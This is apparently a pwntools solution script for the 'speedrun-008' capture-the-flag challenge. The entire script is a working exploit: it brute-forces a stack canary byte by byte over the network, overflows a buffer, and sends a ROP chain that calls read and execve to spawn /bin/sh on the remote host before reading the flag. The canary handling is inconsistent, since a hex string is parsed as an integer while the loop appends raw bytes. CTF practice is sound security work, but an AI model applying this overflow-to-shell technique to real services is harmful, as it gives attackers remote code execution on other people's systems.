from pwn import *

# stage 1. leak canary
payload = "A"*0x408
canary = "0x1e5c4a312050c900"

if canary == "":
	for i in range(0, 8):
		for c in range(0, 256):
			conn = remote("speedrun-008.quals2019.oooverflow.io", 31337)
			conn.recvuntil("Yes?")
			
			conn.send(payload + canary + chr(c))
			result = conn.recvall()
			if "Peace out." in result:
				canary += chr(c)
				conn.close()
				print(canary)
				break
			conn.close()

canary = int(canary, 16)
log.info("canary : "+hex(canary))


# stage 2. rop
conn = remote("speedrun-008.quals2019.oooverflow.io", 31337)

conn.recvuntil("Yes?")

pop_rax = 0x0045fc14
pop_rdi = 0x0048fc57
pop_rsi = 0x004732bd
pop_rdx = 0x0044be76

syscall_ret = 0x00474ec5

bss = 0x006bc000-0x200

payload  = "A"*0x408
payload += p64(canary)
payload += p64(bss-0x100) 	# sfp
payload += p64(pop_rdi)	+ p64(0)	#  fd  : 0
payload += p64(pop_rsi)	+ p64(bss)	# *buf : bss	
payload += p64(pop_rdx)	+ p64(8)	# size : 8
payload += p64(pop_rax) + p64(0)	# syscall num 0(read)
payload += p64(syscall_ret)
payload += p64(pop_rdi)	+ p64(bss)	# "/bin/sh\x00"
payload += p64(pop_rsi)	+ p64(0)	# NULL
payload += p64(pop_rdx)	+ p64(0)	# NULL
payload += p64(pop_rax) + p64(59)	# syscall num 59(execve)
payload += p64(syscall_ret)
payload += p64(0x400C58)

conn.sendline(payload)
conn.send("/bin/sh\x00")
conn.sendline("cat flag;")


conn.interactive()